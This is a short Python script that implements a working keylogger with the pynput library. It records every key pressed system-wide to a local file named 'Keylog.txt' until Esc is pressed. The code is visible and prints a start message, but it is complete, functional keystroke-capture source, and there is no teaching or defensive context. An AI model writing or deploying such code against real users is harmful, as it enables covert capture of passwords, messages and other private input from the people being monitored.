from pynput.keyboard import Key, Listener

log_file = "Keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press 'Esc' if you want to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
